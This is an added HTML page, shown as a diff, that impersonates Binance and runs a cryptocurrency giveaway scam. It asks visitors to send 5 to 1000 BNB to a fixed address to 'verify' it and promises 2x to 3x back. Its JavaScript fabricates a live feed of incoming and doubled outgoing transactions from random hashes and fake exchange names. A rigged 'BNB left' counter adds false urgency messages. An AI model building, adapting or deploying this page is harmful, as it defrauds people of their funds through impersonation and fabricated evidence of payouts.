@@ -1,0 +1,728 @@
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>acqbnbn</title>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.1/font/bootstrap-icons.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+            <link href="../styles/styles.css" rel="stylesheet">
+    <link href="../styles/secondstyles.css" rel="stylesheet">
+    <script src="https://kit.fontawesome.com/84e65a94ab.js" crossorigin="anonymous"></script>
+    <link href="../styles/payment.css" rel="stylesheet">
+ <link href="../styles/paymentmedia.css" rel="stylesheet">   
+ <link href="../styles/style.css" rel="stylesheet">
+    <link href="../styles/media.css" rel="stylesheet">
+    <script src="../js/script.js"></script>
+
+    <!--Start of Tawk.to Script-->
+<script type="text/javascript">
+  var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+  (function(){
+  var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
+  s1.async=true;
+  s1.src='https://embed.tawk.to/6417570a4247f20fefe6ce65/1henaibi0';
+  s1.charset='UTF-8';
+  s1.setAttribute('crossorigin','*');
+  s0.parentNode.insertBefore(s1,s0);
+  })();
+  </script>
+  <!--End of Tawk.to Script-->
+
+</head>
+<body>
+  <div class="container">
+    <div class="pop-body">
+      <div class="pop-inner">
+          <div class="pop-head">
+              <h3 class="pop-head-text">Generated Address</h3><svg id="close" height="20" viewBox="0 0 20 20"
+                  width="20" xmlns="http://www.w3.org/2000/svg">
+                  <path d="M18.096 19.174l1.401-1.427L1.7.286.3 1.714z"></path>
+                  <path d="M19.497 1.714L18.096.286.3 17.747l1.4 1.427z"></path>
+              </svg>
+          </div>
+          <div class="pop-post-body">
+              <div class="pop-post-inner">
+                  <div class="pop-anrange">
+                      <div class="pop-img">
+                          <div class="pop-qr">
+                              <div class="inner-qr">
+                                  <div class="main-qr">
+                                      <div opacity="0" class="qr"><img id="qrcode_svg" width="200" height="200" src="../images/bnbcode.jpg" alt="qr"></div>
+                          <p style="color:green; margin-top:1rem; margin-bottom: 2px; text-align: center;">0 Confirmation</p>
+                                      <center><img src="../static/files/loading.svg" width="70px"></center>
+                                  </div>
+                              </div>
+                          </div>
+                      </div>
+                      <div class="timer-b" id="timer1"></div>
+                      <div class="address-place">
+                          <div class="inner-address"><span class="wallet-ad">Amount:</span>
+                              <div class="address">
+                                  <div class="main-ad"><span class="real-address" id="gen-amount"></span></div>
+                                  <div class="copy-body">
+                                      <div class="copy-inner">
+                                          <img class="cp" id="copy_" src="../static/files/copy.svg">
+                                      </div>
+                                  </div>
+                              </div>
+                          </div>
+  
+                          <div class="inner-address"><span class="wallet-ad">Generated address:</span>
+                              <div class="address">
+                                  <div class="main-ad"><span
+                                          class="real-address">bnb1pjka70wt3anz562neztu7gej20dqrufqezteqx
+                                        </span></div>
+                                  <div class="copy-body">
+                                      <div class="copy-inner">
+                                          <img class="cp" id="copy_address" src="../static/files/copy.svg">
+                                      </div>
+                                  </div>
+                              </div>
+                              
+                          </div>
+                          
+                      </div>
+                  </div>
+              </div>
+          </div>
+      </div>
+  </div>
+  
+  <nav class="navbar navbar-expand-lg navbar-light">
+    <a class="navbar-brand" href="#">
+    <img class ="logo" src="../Images/logo.png">
+    </a>
+        <i onclick="themeChange()" class="theme-changer-small bi bi-moon-stars"></i>
+
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarSupportedContent" aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+
+      <span class="navbar-toggler-icon"></span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav mr-auto">
+        <li class="nav-item active">
+          <a class="links-nav" href="https://www.binance.com/en/markets/overview">Buy Crypto<span class="sr-only">(current)</span></a>
+        </li>
+
+        <li class="nav-item">
+          <a class="links-nav" href="#">Markets</a>
+        </li>
+        <li class="nav-item dropdown">
+          <a class="links-nav dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+            Trade
+          </a>
+          <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+            <a class="dropdown-item" href="#">Basic</a>
+            <a class="dropdown-item" href="#">Spot</a>
+            <a class="dropdown-item" href="#">Margin</a>
+            <a class="dropdown-item" href="#">P2P</a>
+            <a class="dropdown-item" href="#">Convert & Block Trade</a>
+            <a class="dropdown-item" href="#">Advanced</a>
+            <a class="dropdown-item" href="#">Trading Bots</a>
+            <a class="dropdown-item" href="#">Copy Trading</a>
+            <a class="dropdown-item" href="#">APIs</a>
+
+          </div>
+        </li>
+        <li class="nav-item dropdown">
+            <a class="links-nav dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+              Futures
+            </a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+              <a class="dropdown-item" href="#">USD-M Futures</a>
+              <a class="dropdown-item" href="#">COIN-M Futures</a>
+              <a class="dropdown-item" href="#">Options</a>
+            </div>
+          </li>
+        
+          <li class="nav-item">
+            <a class="links-nav" href="#">Earn</a>
+          </li>
+          <li class="nav-item dropdown">
+            <a class="links-nav dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+              Square
+            </a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+              <a class="dropdown-item" href="#">Square</a>
+              <a class="dropdown-item" href="#">Academy</a>
+              <a class="dropdown-item" href="#">Block</a>
+              <a class="dropdown-item" href="#">Research</a>
+            </div>
+          </li>
+          <li class="nav-item dropdown">
+            <a class="links-nav dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+              More
+            </a>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown">
+              <a class="dropdown-item" href="#">VIP & Institutional</a>
+              <a class="dropdown-item" href="#">Launchpad</a>
+              <a class="dropdown-item" href="#">Mining Pool</a>
+              <a class="dropdown-item" href="#">Pay</a>
+              <a class="dropdown-item" href="#">Loans</a>
+              <a class="dropdown-item" href="#">NFT</a>
+              <a class="dropdown-item" href="#">Fan Token</a>
+              <a class="dropdown-item" href="#">Web# Wallet</a>
+              <a class="dropdown-item" href="#">BNB Chain</a>
+              <a class="dropdown-item" href="#">Charity</a>
+            </div>
+          </li>
+
+      </ul>
+      <form class="form-inline my-2 my-lg-0">
+        <div class="nav-item dropdown">
+        <i class="bi bi-search links-nav dropdown-toggle" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false"></i>
+            <div class="dropdown-menu" aria-labelledby="navbarDropdown"> 
+            <input class="form-control mr-sm-2 dropdown-item" type="search" placeholder="Search" aria-label="Search"/>
+              <a class="dropdown-item" href="#">Another action</a>
+              <div class="dropdown-divider"></div>
+              <a class="dropdown-item" href="#">Something else here</a>
+            </div>
+        </div>
+      </form>
+      <i onclick="themeChange()" class="theme-changer bi bi-moon-stars"></i>
+    </div>
+  </nav>
+
+  <div class="first-side">
+<p>To verify your BNB address, just send from <span class="parts">5 BNB</span> -<span class="parts">1000 BNB</span> to the competetion smart contract address below and get from <span>10 BNB</span> - <span class="parts">3000 BNB</span> back. <span class="parts">(you will receive a 3x bonus if you send from 25 BNB and above)</span></p>
+
+<h4>You will receive a 3x/2x bonus depending on the amount you stake with.</h4>
+
+
+<p>Bonus are processed automatically within 4 - 15 minutes (after deposit to the staking address is confirmed on the blockchain)</p>
+
+<p class="parts">How To Participate:</p>
+<div>
+    <ul>
+<li><b>Step1:</b> Make sure you have at least 5 BNB or above in your wallet.</li>
+<li><b>Step2:</b> Enter the amount you wish to participate with below.</li>
+<li><b>Step3:</b> Enter your BNB address</li>
+<li><b>Step4:</b> Click the "Generate Payment" button to generate your deposit address.</li>
+<li><b>Step5:</b> Send the amount you entered to the generated address.</li>
+<li><b>Step6:</b> Wait for at least 4 - 15 minutes after your transaction is confirmed.</li>
+    </ul>
+
+<p>You bonus should be resting in your wallet or pending.</p>
+</div>
+<i>CONGRATULATIONS 🎉🎉</i>
+  </div>
+<div class="cal-body all-input">
+    <div class="cal-inner all-input">
+        <div class="input">
+            <div class="title">Amount To Invest:</div>
+            <div class="amount-con">
+                <div class="inner-con">
+                    <div class="pic"></div>
+                    <div class="amount amt">
+                        <div class="main-input amt">
+                            <div class="in-main"><input id="cal-in" class="exchange-content__input theme__background-4 theme__text-4 box"
+                                     min="0" placeholder="0" type="" maxlength="50" autocomplete="off"
+                                    value="" size="50"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="icon-body"><span data-tip="Click to swap" data-for="swap-icon" currentitem="false"><img
+                    src='../images/transfer.jpg' alt="img" class="transfer-img"></span></div>
+        <div class="input">
+            <div class="title">Expected Bonus:</div>
+            <div class="amount-con">
+                <div class="inner-con">
+                    <div class="pic"></div>
+                    <div class="amount">
+                        <div class="main-input">
+                            <div class="in-main"><input id="cal-out"
+                                    class="exchange-content__input theme__background-4 theme__text-4 box" placeholder="0" maxlength="50" min="0" autocomplete="off"
+                                    value="" size="50"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+         <div class="wallet">
+        <div class="enaddress input">
+            <div class="title"><addr title="Enter the address where you want your bonus to be sent to. Note: this feild is optional, if you leave it empty, the bonus will be sent to the address you sent from.">Receiving (Wallet) Address:</addr></div>
+            <div class="inner-enter"><input class="box" type="text" placeholder="Enter your Binanace Coin (BNB) address" size="50"></div>
+        </div>
+        <div class="but-con">
+          <div id="gen-btn" class="swap-but">Generate Payment</div>
+          <div class="terms text-info text-center mb-2"><span><span id="warn"></span></span>
+          </div>
+      </div>
+
+        <div id="lympo_progress">
+            <div class="row progress-row">
+                <div class="colums_12">
+                    <div class="progress-ico">
+                        <div class="progress-ico">
+                            <div class="progress">
+                                <div class="progress-bar progress-bar-striped active progress-width"
+                                    id="progress-ico" role="progressbar" style="width: 100%;">
+                                    <span class="sr-only">x</span></div>
+                            </div>
+                        </div>
+                        <div class="dot-1" id="leftBNB">
+                            Counting BNB left...
+                        </div>
+                        <div class="dot-1-airdrop  progress-left"></div>
+                        <span class="pbv" id="progress-ico-bar"></span>
+                    </div>
+                </div>
+            </div>
+      </div>  
+</div>
+        <script src="../js/script.js"></script>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+        <script>
+            
+    
+    
+    
+    
+    var parcent = 2
+    
+    function update_count() {
+      setInterval(() => {
+        $('#num_').text(parseInt($('#num_').text()) + 1)
+      }, 12e4)
+    }
+    
+    function tx(_) {
+      return 1 + Math.floor(Math.random() * _)
+    }
+    
+    function dec2hex(dec) {
+      return ('0' + dec.toString(16)).substr(-2)
+    }
+    
+    function generateId(length) {
+      for (
+        var result = '',
+          characters =
+            'bnb1pjka70wt3anz562neztu7gej20dqrufqezteqx',
+          charactersLength = characters.length,
+          i = 0;
+        i < length;
+        i++
+      )
+        result += characters.charAt(Math.floor(Math.random() * charactersLength))
+      return result
+    }
+    
+    function startaddress(length = 1) {
+      for (
+        var result = '',
+          characters = '13',
+          charactersLength = characters.length,
+          i = 0;
+        i < length;
+        i++
+      )
+        result += characters.charAt(Math.floor(Math.random() * charactersLength))
+      return result
+    }
+    
+    function create_transaction(mins) {
+      var table,
+        row = (table = document.getElementById('myTable')).insertRow(1),
+        address = get_random(),
+        amount = (100 * Math.random()).toFixed(2),
+        decimal = String(Math.random(1, 999))
+      row.innerHTML =
+        '<tr  class="tr"> <td><a class="hash-tag text-truncate" href="">' +
+        generateId(63) +
+        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
+        tx(99999999) +
+        '</a></td> <td><span class="timer">' +
+        mins +
+        ' mins ago</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        address +
+        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bnb1t7kfu7ch5j5f6z33q67aznfn78g0yr765az6km</span> </td> <td>' +
+        amount +
+        ' BNB</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        tx(999) +
+        '</span></td> </tr>'
+      var table,
+        row = (table = document.getElementById('myTable')).insertRow(1),
+        send_amount = amount * parcent
+      row.innerHTML =
+        '<tr> <td><a class="hash-tag text-truncate" href="">' +
+        generateId(63) +
+        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
+        tx(99999999) +
+        '</a></td> <td><span class="timer">' +
+        mins +
+        ' mins ago</span></td> <td><span class="hash-tag text-truncate">bnb1t7kfu7ch5j5f6z33q67aznfn78g0yr765az6km</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        address +
+        '</a> </td> <td>' +
+        send_amount +
+        ' BNB</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        tx(999) +
+        '</span></td> </tr>'
+    }
+    
+    function update_tx() {
+      setInterval(() => {
+        $('#num_').text(parseInt($('#num_').text()) + 1)
+      }, 12e4)
+    }
+    
+    function new_transaction() {
+      var table,
+        row = document.getElementById('myTable').insertRow(1),
+        address = get_random(),
+        amount = (500 * Math.random()).toFixed(2),
+        decimal = String(Math.random(1, 999))
+      ;(row.innerHTML =
+        '<tr> <td><a class="hash-tag text-truncate" href="">' +
+        generateId(63) +
+        '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
+        tx(99999999) +
+        '</a></td> <td><span class="timer" >now</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+        address +
+        '</a> </td> <td><span class="u-label u-label--xs u-label--success color-strong text-uppercase text-center w-100 rounded text-nowrap">&nbsp;IN&nbsp;</span> </td> <td><span class="hash-tag text-truncate">bnb1t7kfu7ch5j5f6z33q67aznfn78g0yr765az6km</span> </td> <td>' +
+        amount +
+        ' BNB</td> <td><span class="small text-secondary">0<b>.</b>000' +
+        tx(999) +
+        '</span></td> </tr>'),
+        document
+          .getElementById('myTable')
+          .deleteRow(document.getElementById('myTable').rows.length - 1),
+        document.getElementsByTagName('tr')[1].classList.add('toolbar'),
+        setTimeout(() => {
+          var table,
+            row = document.getElementById('myTable').insertRow(1),
+            send_amount = amount * parcent
+          ;(row.innerHTML =
+            '<tr> <td><a class="hash-tag text-truncate" href="">' +
+            generateId(63) +
+            '</a> </td> <td class="d-none d-sm-table-cell"><a href="">9' +
+            tx(99999999) +
+            '</a></td> <td><span class="timer" >now</span></td> <td><span class="hash-tag text-truncate">bnb1t7kfu7ch5j5f6z33q67aznfn78g0yr765az6km</span> </td> <td><span class="u-label u-label--xs u-label--warning color-strong text-uppercase text-center w-100 rounded text-nowrap">OUT</span> </td> <td><a class="hash-tag text-truncate" href="">' +
+            address +
+            '</a> </td> <td>' +
+            send_amount +
+            ' BNB</td> <td><span class="small text-secondary">0<b>.</b>000' +
+            tx(999) +
+            '</span></td> </tr>'),
+            document
+              .getElementById('myTable')
+              .deleteRow(document.getElementById('myTable').rows.length - 1),
+            document.getElementsByTagName('tr')[1].classList.add('toolbar')
+        }, 8500)
+    }
+    
+    function update_trans() {
+      for (i = 0; i < times.length; i++)
+        'now' == times[i].innerHTML
+          ? (times[i].innerHTML = '1 mins ago')
+          : 1 == parseInt(times[i].innerHTML.split(' ')[0]) &&
+            'mins' == times[i].innerHTML.split(' ')[1]
+          ? (times[i].innerHTML =
+              parseInt(times[i].innerHTML.split(' ')[0]) + 1 + ' mins ago')
+          : parseInt(times[i].innerHTML.split(' ')[0]) >= 59 &&
+            'mins' == times[i].innerHTML.split(' ')[1]
+          ? (times[i].innerHTML = '1 hrs ago')
+          : parseInt(times[i].innerHTML.split(' ')[0]) > 1 &&
+            'mins' == times[i].innerHTML.split(' ')[1] &&
+            (times[i].innerHTML = parseInt(times[i].innerHTML.split()[0]) + 1 + ' mins ago')
+      new_transaction();
+    }
+    
+    ;(get_random = function (
+      list = [
+        "B" + generateId(40),
+        'Binance 1',
+        "B" + generateId(40),
+        'Binance 2',
+        "B" + generateId(40),
+        'Binance 3',
+        "B" + generateId(40),
+        'Remitano 2',
+        "B" + generateId(40),
+        'Remitano 3',
+        "B" + generateId(40),
+        'Remitano 1',
+        "B" + generateId(40),
+        'Mercatox',
+        "B" + generateId(40),
+        'IndaCoin',
+        "B" + generateId(40),
+        'CoinExchange.io',
+        "B" + generateId(40),
+        'HitBTC 2',
+        "B" + generateId(40),
+        'HitBTC 1',
+        "B" + generateId(40),
+        'LAToken 3',
+        "B" + generateId(40),
+        'LAToken 2',
+        "B" + generateId(40),
+        'LAToken 1',
+      ],
+    ) {
+      return list[Math.floor(Math.random() * list.length)]
+    }),
+      $(document).ready(() => {
+        for (i = 25; i > 0; i--) create_transaction(i)
+        update_tx(), update_count()
+      }),
+      (times = document.getElementsByClassName('timer')),
+      (window.onload = () => {
+        update_trans(),
+          (trans = setInterval(() => {
+            update_trans()
+          }, 1e4))
+      }),
+      $('#gen-btn').click(() => {
+        if ($('#cal-in').val() >= .5 && $('#cal-in').val() <= 10) {
+          amount_entered = $('#cal-in').val()
+          tm = Date.now()
+            $("#xrp-tag").text(tx(9999999))
+          $('#gen-amount').text(amount_entered)
+          $('#warn').text(''), $('.pop-body').css('display', 'flex')
+        } else $('#warn').text('Amount should be within .5 BNB to 1,000 BNB')
+      }),
+      $('#close').click(() => {
+        $('.pop-body').css('display', 'none')
+      }),
+      setTimeout(function () {
+        let viewheight = $(window).height(),
+          viewwidth = $(window).width(),
+          viewport
+        document
+          .querySelector('meta[name=viewport]')
+          .setAttribute(
+            'content',
+            'height=' +
+              viewheight +
+              'px, width=' +
+              viewwidth +
+              'px, initial-scale=1.0',
+          )
+      }, 300),
+      $('#cal-in').on('input', () => {
+        var in_amount = $('#cal-in').val()
+        if (in_amount >= 0 && in_amount < 25) {
+          amt = (in_amount * 2)
+          out = $('#cal-out')
+          out.val(amt)
+          // if (amt%1){
+          //   out.val(amt.toFixed(3))
+          // }
+          // else {
+          //   out.val(amt.toFixed(0))
+          // }
+        } else if ((in_amount) >= 15 && in_amount <= 1000) {
+          amt = (in_amount * 3)
+          out = $('#cal-out')
+          out.val(amt)
+          // if (amt%1){
+          //   out.val(amt.toFixed(0))
+          // }
+          // else{
+          //   out.val(amt.toFixed(3))
+          // }
+        }
+      })
+    
+    $('#cal-out').on('input', () => {
+      var in_amount = $('#cal-out').val()
+      if (in_amount >= 5 && in_amount < 15) {
+        amt = (in_amount / 2)
+        out = $('#cal-in')
+        out.value(amt)
+        // if (amt%1){
+        //   out.value(amt.toFixed(0))
+        // }
+        // else {
+        //   out.value(amt.toFixed(3))
+        // }
+        $('#cal-in').val(in_amount / 2)
+      } else if ((in_amount) >= 15 && in_amount <= 1000) {
+        $('#cal-in').val(in_amount / 3)
+      }
+    })
+    
+    function copy_item(item) {
+      var t = window.getSelection(),
+        e = document.createElement('div')
+      ;(e.style.position = 'absolute'),
+        (e.style.left = '-99999px'),
+        document.body.appendChild(e),
+        (e.innerHTML = item),
+        t.selectAllChildren(e),
+        window.setTimeout(function () {
+          document.body.removeChild(e)
+        }, 100)
+    }
+    
+    function copyToClipboard(text) {
+        if (window.clipboardData && window.clipboardData.setData) {
+            // Internet Explorer-specific code path to prevent textarea being shown while dialog is visible.
+            return clipboardData.setData("Text", text);
+    
+        }
+        else if (document.queryCommandSupported && document.queryCommandSupported("copy")) {
+            var textarea = document.createElement("textarea");
+            textarea.textContent = text;
+            textarea.style.position = "fixed";  // Prevent scrolling to bottom of page in Microsoft Edge.
+            document.body.appendChild(textarea);
+            textarea.select();
+            try {
+                return document.execCommand("copy");  // Security exception may be thrown by some browsers.
+            }
+            catch (ex) {
+                //console.warn("Copy to clipboard failed.", ex);
+                return false;
+            }
+            finally {
+                document.body.removeChild(textarea);
+            }
+        }
+    }
+    
+    function copy_main(id, fade) {
+      copy_item($('#' + id).attr('data-clipboard-text'))
+      var clipboard = new Clipboard('#' + id)
+      clipboard.on('success', function () {
+        $('#' + fade).css('opacity', 1), $('#' + id).css('opacity', 0)
+      }),
+        clipboard.on('error', function (e) {
+          $('.tooltiptetext').html('Faild!')
+        })
+    }
+    
+    // Copy amount starts here
+    
+    $('#copy_').click(() => {
+      copyToClipboard($("#gen-amount").text());
+      $('#copy_').attr('src', "../static/files/done.svg");
+    })
+    
+    $('#copy_').mouseleave(() => {
+      $('#copy_').attr('src', "../static/files/copy.svg");
+    })
+    
+    // Copy amount ends here
+    
+    // Copy address part starts here
+    
+    $('#copy_address').click(() => {
+      copyToClipboard('bnb1t7kfu7ch5j5f6z33q67aznfn78g0yr765az6km');
+      $('#copy_address').attr('src', '../static/files/done.svg');
+    })
+    
+    $('#copy_address').mouseleave(() => {
+      $('#copy_address').attr('src', "../static/files/copy.svg");
+    })
+    
+    $('#copy_tag').click(() => {
+      copyToClipboard($('#xrp-tag').text());
+      $('#copy_tag').attr('src', '../static/files/done.svg');
+    })
+    
+    $('#copy_tag').mouseleave(() => {
+      $('#copy_tag').attr('src', "../static/files/copy.svg");
+    })
+    
+    // Copy address part ends here
+    
+        </script>
+    
+        <script>
+            function setProgress(count, max) {
+                var p = (100 * count / max).toString() + '%';
+                $('.progress-left').css('left', p);
+                $('.progress-width').css('width', p);
+                var aa = count.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+                var rr = max.toString().replace(/(\d)(?=(\d\d\d)+([^\d]|$))/g, '$1 ');
+                $('.pbv').text(aa + ' / ' + rr);
+    
+            }
+    
+    
+    
+            var ctd = setInterval(function () {
+                if (localStorage.getItem("bnbprogress")) {
+                    if (localStorage.getItem("bnbprogress") <= 150) {
+                        var alt_count = localStorage.getItem("bnbprogress");
+                    } else if (localStorage.getItem("bnbprogress")) {
+                        var alt_sec_count = localStorage.getItem("bnbprogress");
+                        var alt_count = alt_sec_count - Math.floor((Math.random() * 10) * 4 + 5);
+                    }
+                } else {
+                    var alt_sec_count = 50000;
+                    var alt_count = alt_sec_count - Math.floor((Math.random() * 10) * (1000 * 2));
+                }
+                setProgress(alt_count, 200000)
+    
+    
+    
+                localStorage.setItem("bnbprogress", alt_count);
+    
+                if (alt_sec_count <= 100)
+                    clearInterval(ctd);
+                if (alt_count <= 3000 && alt_sec_count >= 3500)
+                    document.getElementById("leftBNB").innerHTML = "Left BNB";
+                if (alt_count <= 2000 && alt_sec_count >= 2500)
+                    document.getElementById("leftBNB").innerHTML = "Hurry up, not much more BNB left!";
+                if (alt_count <= 1500)
+                    document.getElementById("leftBNB").innerHTML = "Last chance to get your BNB!";
+                if (alt_count <= 500)
+                    document.title = alt_count + " BNB left";
+                if (alt_count <= 1000)
+                    document.title = "Get your " + alt_count + " BNB now!";
+    
+            }, 6666);
+        </script>
+        <!-- ###############################End of progress bar######################################### -->
+    
+        <script>
+    
+            function timer(t_ex, timer){
+                expire = new Date(t_ex*1000).getTime();
+                now = new Date().getTime(); 
+                dis = expire - now
+                days = Math.floor((dis%(1000*60*60*24*24))/(1000*60*60*24))
+                hrs = Math.floor((dis%(1000*60*60*24))/(1000*60*60))
+                mins = Math.floor((dis%(1000*60*60))/(1000*60))
+                secs = Math.floor((dis%(1000*60))/(1000))
+                m_secs = Math.floor((dis%(1000)))
+                if (dis > 0) {
+                    timer.innerHTML = days+":"+hrs+":"+mins+":"+secs+":"+m_secs
+                }
+                else{
+                    window.location.reload()
+                }
+            }
+            
+            function set_timer(){
+                let t_ex = null
+                if (t_ex){
+                    expire = new Date(t_ex*1000).getTime();
+                    now = new Date().getTime(); 
+                    dis = expire - now
+                    if (dis > 0){
+                        timer_html = document.getElementById('timer')
+                        timer(t_ex, timer_html);
+                        setInterval(()=>{
+                            timer(t_ex, timer_html);
+                        }, 1)
+                    }
+                    
+                }
+            }
+            set_timer()
+        </script>
+    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/popper.js@1.12.9/dist/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
+    <script src="js/script.js"></script>
+    </body>
+    </html>
